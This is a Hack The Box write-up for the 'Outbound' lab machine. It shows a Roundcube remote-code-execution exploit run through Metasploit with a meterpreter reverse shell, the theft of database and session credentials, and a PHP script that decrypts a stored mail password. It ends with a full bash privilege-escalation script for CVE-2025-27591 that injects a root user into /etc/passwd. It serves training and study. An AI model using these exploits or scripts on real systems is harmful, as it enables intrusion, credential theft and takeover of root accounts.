---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - CVE-2025-49113
  - CVE-2025-27591
  - DES-Decryption
  - Below
---
# Overview

As is common in real life pentests, you will start the Outbound box with credentials for the following account `tyler` / `LhKL1o9Nm3X2`
# Recon
## Nmap

```bash
❯ sudo nmap  -sV -sC -O 10.10.11.77 -oN outbound
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 11:21 +0545
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
❯ cat /etc/hosts                                                   
127.0.0.1	localhost
127.0.1.1	hax0r

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.77 outbound.htb mail.outbound.htb
```
# Exploitation of Roundcube Webmail
## CVE-2025-49113

We can login to its about section and find that its version is `Roundcube Webmail 1.6.10`.

Found this exploit [here](https://www.exploit-db.com/exploits/52324). 

```bash
mkdir -p ~/.msf4/modules/exploits/linux/http
mv rce.rb ~/.msf4/modules/exploits/linux/http/rce.rb
```

```bash
msf6 > use exploit/linux/http/rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/rce) > show options

Module options (exploit/linux/http/rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HOST                        no        The hostname of Roundcube server
   PASSWORD                    yes       Password to login with
   Proxies                     no        A proxy chain of format type:hos
                                         t:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://
                                         docs.metasploit.com/docs/using-m
                                         etasploit/basics/using-metasploi
                                         t.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing c
                                         onnections
   SSLCert                     no        Path to a custom SSL certificate
                                          (default is randomly generated)
   TARGETURI  /                yes       The URI of the Roundcube Applica
                                         tion
   URIPATH                     no        The URI to use for this exploit
                                         (default is random)
   USERNAME                    yes       Email User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interfac
                                       e to listen on. This must be an ad
                                       dress on the local machine or 0.0.
                                       0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may
                                      be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Dropper



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/rce) > set USERNAME tyler
USERNAME => tyler
msf6 exploit(linux/http/rce) > set PASSWORD LhKL1o9Nm3X2
PASSWORD => LhKL1o9Nm3X2
msf6 exploit(linux/http/rce) > set RHOSTS 10.10.11.77
RHOSTS => 10.10.11.77
msf6 exploit(linux/http/rce) > set VHOST mail.outbound.htb
VHOST => mail.outbound.htb
msf6 exploit(linux/http/rce) > set LHOST 10.10.14.57
LHOST => 10.10.14.57
msf6 exploit(linux/http/rce) > set LPORT 4444
LPORT => 4444
msf6 exploit(linux/http/rce) > run
[*] Started reverse TCP handler on 10.10.14.57:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: 3CbDLoP1WwHlfjL8WGnyEFBAIqm6MlHK
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3045380 bytes) to 10.10.11.77
[*] Meterpreter session 1 opened (10.10.14.57:4444 -> 10.10.11.77:54444) at 2025-07-13 11:46:05 +0545

meterpreter > shell
Process 1115 created.
Channel 1 created.
whoami
www-data
```
# Enumeration
## Container Enmeration

```bash
ls /home
jacob
mel
tyler
```

We don't seem to get any permission to view them tho.

```bash
$ su tyler
Password: LhKL1o9Nm3X2
whoami
tyler
```

We are still in container. Aughh! After enumeration we get to ` /var/www/html/roundcube/config/config.inc.php`. Use `/bin/bash -i` to get interactive shell since python is not there.

```bash
<SNIP>
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';
<SNIP>
```

Alternatively, use can SSH for a more stable session:

`ssh tyler@10.10.11.77`

But we get permission denied, it means password is different for SSH. Lets just use SQL creds we got.
## Database Access

```bash
www-data@mail:/$ mysql -u roundcube -pRCDBPass2025 -D roundcube -e "SHOW TABLES;"
<dcube -pRCDBPass2025 -D roundcube -e "SHOW TABLES;"
Tables_in_roundcube
cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users
```

```bash
www-data@mail:/$  mysql -u roundcube -pRCDBPass2025 -D roundcube -e "SELECT
 * FROM session LIMIT 5;"
<25 -D roundcube -e "SELECT * FROM session LIMIT 5;"
sess_id	changed	ip	vars
6a5ktqih5uca6lj8vrmgh9v0oh	2025-06-08 15:46:40	172.17.0.1	bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
<SNIP>
```
## Decrypting DES-encrypted Password

First decode this `base64` encoded blob and from here we can get encrypted password.

```bash
~ ❯ echo bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czo
xODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 | base64 -d

language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";                 
```

These password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`, It is DES Encrypted which means it's **encrypted** before storage, likely for security reasons. We have `des_key` from `/var/www/html/roundcube/config/config.inc.php` :

```bash
<SNIP>
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
<SNIP>
```

We got DES key, 

```bash
rcmail-!24ByteDESkey*Str
```

Lets decrypt `jacob` hash `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` using `des_key`:

```php
<?php

$encrypted = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";

$key = 'rcmail-!24ByteDESkey*Str';

// Decode Base64

$data = base64_decode($encrypted);

// Extract IV (first 8 bytes for 3DES)

$iv = substr($data, 0, 8);

$ciphertext = substr($data, 8);

// Decrypt (3DES-CBC)

$password = openssl_decrypt(

$ciphertext,

'des-ede3-cbc', // 3DES algorithm

$key,

OPENSSL_RAW_DATA,

$iv

);

echo "Decrypted password: " . $password;

?>
```

```bash
❯ php decrypt.php
Decrypted password: 595mO8DmwGeD
```
## Logging in as Jacob in Roundcube

Now log in to email service that is site `mail.outbound.htb` using this password of `jacob` , not SSH.

After logging in, In Mail section we see this message from `tyler`.

```
Due to the recent change of policies your password has been changed.  
  
Please use the following credentials to log into your account: gY4Wr3a1evp4  
  
Remember to change your password when you next log into your account.  
  
Thanks!  
  
Tyler
```
## SSH as Jacob

```bash
~ ❯ ssh jacob@10.10.11.77
jacob@10.10.11.77 password: gY4Wr3a1evp4

jacob@outbound:~$ ls 
aaa  snapshot_01752431491_01752431491.xLzW52  user.txt
jacob@outbound:~$ cat user.txt
7061337cb6480d9ef509f4c2c4d91f86
```
# Privilege Escalation
## CVE-2025-27591

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
        !/usr/bin/below --debug*, !/usr/bin/below -d*
```

**Below** is a performance monitoring and tracing tool for Linux systems (developed by Meta).

`Below` versions <= 0.8.1 contains a critical local privilege escalation vulnerability (CVE-2025-27591).  
Due to a misconfigured world-writable log directory (`/var/log/below/`) and insecure permission logic in the Rust codebase, a local attacker can symlink `error_<user>.log` to any root-owned file like `/etc/passwd`.

Here is [repo](https://github.com/obamalaolu/CVE-2025-27591/blob/main/CVE-2025-27591.sh) for POC.

```bash
#!/bin/bash

# CVE-2025-27591 Exploit - Privilege Escalation via 'below'

TARGET="/etc/passwd"
LINK_PATH="/var/log/below/error_root.log"
TMP_PAYLOAD="/tmp/payload"
BACKUP="/tmp/passwd.bak"

echo "[*] CVE-2025-27591 Privilege Escalation Exploit"

# Check for sudo access to below
echo "[*] Checking sudo permissions..."
if ! sudo -l | grep -q '/usr/bin/below'; then
  echo "[!] 'below' is not available via sudo. Exiting."
  exit 1
fi

# Backup current /etc/passwd
echo "[*] Backing up /etc/passwd to $BACKUP"
cp /etc/passwd "$BACKUP"

# Generate password hash for 'haxor' user (password: hacked123)
echo "[*] Generating password hash..."
HASH=$(openssl passwd -6 'hacked123')

# Prepare malicious passwd line
echo "[*] Creating malicious passwd line..."
echo "haxor:$HASH:0:0:root:/root:/bin/bash" > "$TMP_PAYLOAD"

# Create symlink
echo "[*] Linking $LINK_PATH to $TARGET"
rm -f "$LINK_PATH"
ln -sf "$TARGET" "$LINK_PATH"

# Trigger log creation with invalid --time to force below to recreate the log
echo "[*] Triggering 'below' to write to symlinked log..."
sudo /usr/bin/below replay --time "invalid" >/dev/null 2>&1

# Overwrite passwd file via symlink
echo "[*] Injecting malicious user into /etc/passwd"
cat "$TMP_PAYLOAD" > "$LINK_PATH"

# Test access
echo "[*] Try switching to 'haxor' using password: hacked123"
su haxor
```

```bash
jacob@outbound:~$ export TERM=xterm
jacob@outbound:~$ nano exploit.sh
jacob@outbound:~$ chmod +x exploit.sh
jacob@outbound:~$ ./exploit.sh
[*] CVE-2025-27591 Privilege Escalation Exploit
[*] Checking sudo permissions...
[*] Backing up /etc/passwd to /tmp/passwd.bak
[*] Generating password hash...
[*] Creating malicious passwd line...
[*] Linking /var/log/below/error_root.log to /etc/passwd
[*] Triggering 'below' to write to symlinked log...
[*] Injecting malicious user into /etc/passwd
[*] Try switching to 'haxor' using password: hacked123
Password: 
haxor@outbound:/home/jacob# whoami
haxor
haxor@outbound:/home/jacob# cat /root/root.txt
a82468d7732042fa80c26def26722f12       
```
## Workarounds

Change the permission on `/var/log/below` manually

---
